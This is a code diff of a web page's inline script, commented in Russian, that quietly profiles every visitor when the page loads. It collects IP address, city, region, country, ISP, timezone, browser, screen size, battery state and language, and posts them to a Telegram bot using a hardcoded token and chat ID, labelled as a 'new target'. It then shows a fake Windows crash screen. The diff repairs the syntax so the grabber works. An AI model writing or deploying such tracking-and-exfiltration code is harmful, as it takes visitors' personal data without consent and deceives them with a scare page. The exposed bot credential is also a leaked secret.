@@ -20,53 +20,40 @@
   <script>
     async function collectAndSend() {
       try {
-        // 1. Получаем IP + геоданные (быстро)
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        // 2. Батарея (если доступна)
         let battery = 'недоступно';
         try {
           if (navigator.getBattery) {
             const b = await navigator.getBattery();
-            battery = ${Math.round(b.level * 100)}% | ${b.charging ? '🔌 заряжается' : '🔋 не заряжается'};
+            battery = Math.round(b.level * 100) + '% | ' + (b.charging ? 'заряжается' : 'не заряжается');
           }
         } catch(e) {}
 
-        // 3. Формируем сообщение
-        const message = 
-🎯 НОВЫЙ ЦЕЛЬ!
-📡 IP: ${data.ip || '—'}
-🌆 Город: ${data.city || '—'}
-📍 Регион: ${data.region || '—'}
-🌍 Страна: ${data.country_name || '—'}
-🏢 Провайдер: ${data.org || '—'}
-🕒 Часовой пояс: ${data.timezone || '—'}
-🖥️ Браузер: ${navigator.userAgent}
-📱 Экран: ${screen.width}x${screen.height}
-🔋 Батарея: ${battery}
-🌐 Язык: ${navigator.language}
-;
+        const message = 'НОВЫЙ ЦЕЛЬ!\n' +
+          'IP: ' + (data.ip || '—') + '\n' +
+          'Город: ' + (data.city || '—') + '\n' +
+          'Регион: ' + (data.region || '—') + '\n' +
+          'Страна: ' + (data.country_name || '—') + '\n' +
+          'Провайдер: ' + (data.org || '—') + '\n' +
+          'Часовой пояс: ' + (data.timezone || '—') + '\n' +
+          'Браузер: ' + navigator.userAgent + '\n' +
+          'Экран: ' + screen.width + 'x' + screen.height + '\n' +
+          'Батарея: ' + battery + '\n' +
+          'Язык: ' + navigator.language;
 
-        // 4. Отправляем в Telegram
         const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
         const chatId = '8098905046';
-        await fetch(https://api.telegram.org/bot${token}/sendMessage, {
+        await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: chatId, text: message })
         });
 
-        // 5. Синий экран
-        document.body.innerHTML = 
-          <div style="background: #0000aa; color: white; display: flex; height: 100vh; justify-content: center; align-items: center; flex-direction: column; font-family: 'Courier New', monospace; padding: 20px; text-align: center;">
-            <h1 style="font-size: 50px;">:(</h1>
-            <p style="font-size: 24px;">Ваш компьютер столкнулся с проблемой</p>
-            <p style="font-size: 14px; margin-top: 40px;">Код ошибки: CRITICAL_PROCESS_DIED</p>
-          </div>
-        ;
+        document.body.innerHTML = '<div style="background:#0000aa;color:white;display:flex;height:100vh;justify-content:center;align-items:center;flex-direction:column;font-family:monospace;padding:20px;text-align:center;"><h1 style="font-size:50px;">:(</h1><p style="font-size:24px;">Ваш компьютер столкнулся с проблемой</p><p style="font-size:14px;margin-top:40px;">Код ошибки: CRITICAL_PROCESS_DIED</p></div>';
       } catch(e) {
-        document.body.innerHTML = <h1 style="color:red;">Ошибка</h1>;
+        document.body.innerHTML = '<h1 style="color:red;">Ошибка</h1>';
       }
     }
     collectAndSend();
